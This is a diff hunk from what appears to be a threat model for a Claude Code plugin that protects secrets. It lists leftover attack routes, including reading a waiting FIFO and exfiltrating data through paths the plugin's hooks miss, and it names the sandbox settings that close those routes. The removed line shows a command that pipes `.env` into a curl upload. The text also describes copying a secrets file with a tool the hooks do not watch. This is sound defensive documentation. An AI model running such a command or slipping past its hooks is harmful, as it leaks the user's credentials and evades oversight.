@@ -54,7 +54,7 @@ a harness scenario that goes red when the control is removed
 - **A3 reading a waiting FIFO.** The same class as `security
   find-generic-password`; the run directory keeps other users out, not the
   user's own processes.
-- **A2 through a path the hooks do not see:** `cat .env | curl -d @- …`, a
+- **A2 through a path the hooks do not see:** a command that pipes `.env` into an upload, a
   copy of `~/.maisecrets` by a tool that is not Bash, Write or Edit. The Claude Code sandbox closes these
   (`sandbox.credentials` deny for the files, `injectHosts` for allowed
   destinations); it lives in the user's settings, not in the plugin, and does
